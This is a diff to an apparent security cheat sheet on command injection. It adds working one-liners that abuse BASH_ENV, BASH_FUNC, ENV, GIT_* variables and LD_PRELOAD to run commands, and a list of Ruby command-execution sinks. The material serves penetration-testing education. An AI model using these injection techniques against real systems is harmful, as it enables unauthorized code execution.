@@ -1,3 +1,144 @@
+# Environment variables
+
+## BASH_ENV
+
+You can use `BASH_ENV` with bash to achieve a command injection:
+
+```bash
+$ BASH_ENV='$(id 1>&2)' bash -c 'echo hello'
+uid=0(root) gid=0(root) groups=0(root)
+hello
+```
+
+References:
+- [Research: How do I use environment variable injection to execute arbitrary commands](https://tttang.com/archive/1450/#toc_0x06-bash_env)
+
+## BASH_FUNC_*%%
+
+You can use `BASH_FUNC_*%%` to initialize an anonymous function according to the value of the environment variable and give it a name. The following sample adds `myfunc` function to the bash context:
+
+```bash
+$ env $'BASH_FUNC_myfunc%%=() { id; }' bash -c 'myfunc'
+uid=0(root) gid=0(root) groups=0(root)
+```
+
+Moreover, you can override an existing functions:
+
+```bash
+$ env $'BASH_FUNC_echo%%=() { id; }' bash -c 'echo hello'
+uid=0(root) gid=0(root) groups=0(root)
+hello
+```
+
+References:
+- [Research: How do I use environment variable injection to execute arbitrary commands](https://tttang.com/archive/1450/#toc_0x08)
+
+## ENV
+
+When you force the [dash](https://linux.die.net/man/1/dash) to behave interactively, dash will look for `ENV` environment variable and pass it into `read_profile` function:
+
+```c
+if ((shinit = lookupvar("ENV")) != NULL && *shinit != '\0') {
+    read_profile(shinit);
+}
+```
+
+`read_profile` will print the `ENV` content:
+
+```bash
+$ ENV='$(id 1>&2)' dash -i -c 'echo hello'
+uid=0(root) gid=0(root) groups=0(root)
+hello
+```
+
+You can gain the same result with `sh`:
+
+```bash
+$ ENV='$(id 1>&2)' sh -i -c "echo hello"
+uid=0(root) gid=0(root) groups=0(root)
+hello
+```
+
+References:
+- [Research: How do I use environment variable injection to execute arbitrary commands](https://tttang.com/archive/1450/#toc_0x03-dash)
+
+## GIT_*
+
+The following `GIT_*` parameters can be used to abuse a git directory:
+
+- [GIT_DIR](https://git-scm.com/book/en/v2/Git-Internals-Environment-Variables) is the location of the `.git` folder
+- [GIT_PROXY_COMMAND](https://git-scm.com/docs/git-config#Documentation/git-config.txt-coregitProxy) is used for overridding `core.gitProxy`
+- [GIT_SSH_COMMAND](https://git-scm.com/docs/git-config#Documentation/git-config.txt-coresshCommand) is used for overridding `core.sshCommand`
+- [GIT_EXTERNAL_DIFF](https://git-scm.com/docs/git-config#Documentation/git-config.txt-diffexternal) is used for overridding `diff.external`
+
+{% embed url="https://0xn3va.gitbook.io/cheat-sheets/web-application/command-injection/parameters-injection@abusing-a-git-directory" %}
+
+## LD_PRELOAD
+
+`LD_PRELOAD` is an optional environmental variable containing one or more paths to shared libraries, or shared objects, that the loader will load before any other shared library including the C runtime library `libc.so`.
+
+In Linux C, functions can be declared with attributes within the function definition. This is done by adding the desired attributes to the function definition. There are two attributes of interest, [constructor and destructor](https://gcc.gnu.org/onlinedocs/gcc-4.7.0/gcc/Function-Attributes.html). A function with the `constructor` attribute will run before the program executes `main()`. For shared objects, this would occur at load time. A function declared with the `destructor` attribute should run once `main()` has returned or `exit()` is called.
+
+{% hint style="info" %}
+LD_PRELOAD can be used to override the standard libc calls, check [Abusing LD_PRELOAD for fun and profit](https://www.sweharris.org/post/2017-03-05-ld-preload/)
+{% endhint %}
+
+In other words, you can compile a shared library to be invoked at load time and/or before return:
+
+1. Reuse the following code for compiling a shared library:
+
+    {% embed url="https://raw.githubusercontent.com/ProfessionallyEvil/LD_PRELOAD-run-at-load-time/main/src/inject.c" %}
+
+2. Compile the shared library with the next command:
+
+    ```bash
+    $ gcc -Wall -O3 -fPIC -shared inject.c -o inject.so
+    ```
+
+3. Exploit:
+
+```bash
+$ LD_PRELOAD=./inject.so git -v
+
+ [+] Inject.so Loaded!
+ [*] PID: 1337
+ [*] Process: /usr/bin/git
+
+Unknown option: -v
+usage: git [--version] [--help] [-C <path>] [-c name=value]
+           [--exec-path[=<path>]] [--html-path] [--man-path] [--info-path]
+           [-p | --paginate | --no-pager] [--no-replace-objects] [--bare]
+           [--git-dir=<path>] [--work-tree=<path>] [--namespace=<name>]
+           <command> [<args>]
+
+ [-] Inject.so is being unloaded!
+```
+
+```bash
+$ LD_PRELOAD=./inject.so id
+
+ [+] Inject.so Loaded!
+ [*] PID: 1337
+ [*] Process: /usr/bin/id
+
+uid=0(root) gid=0(root) groups=0(root)
+```
+
+```bash
+$ LD_PRELOAD=./inject.so bash -c "echo 'hello'"
+
+ [+] Inject.so Loaded!
+ [*] PID: 1337
+ [*] Process: /bin/bash
+
+hello
+
+ [-] Inject.so is being unloaded!
+```
+
+References:
+- [LD_PRELOAD: How to Run Code at Load Time](https://www.secureideas.com/blog/2021/02/ld_preload-how-to-run-code-at-load-time.html)
+
 # Languages
 
 ## Go
@@ -160,8 +301,30 @@ system("os command here")
 # backticks
 `os command here`
 
-# open
-open("\| os command here")
+# Kernel.open
+# https://ruby-doc.org//core-2.2.0/Kernel.html#method-i-open
+open("| os command here")
+
+# Kernel.exec
+Kernel.exec("os command here")
+
+# open-uri.open
+# https://sakurity.com/blog/2015/02/28/openuri.html
+open("| os command here")
+
+# Object.send
+# https://bishopfox.com/blog/ruby-vulnerabilities-exploits
+# additionally, check out Object.public_send
+# https://apidock.com/ruby/Object/public_send
+1.send("eval","`os command here`")
+"".send("eval","`os command here`")
+
+# %x command
+%x os-command-here<SPACE>
+%x os-command-here ;
+%x(os-command-here)
+%x|os-command-here|
+%x{os-command-here}
 
 # https://docs.ruby-lang.org/en/2.0.0/Open3.html
 # Open3.popen3
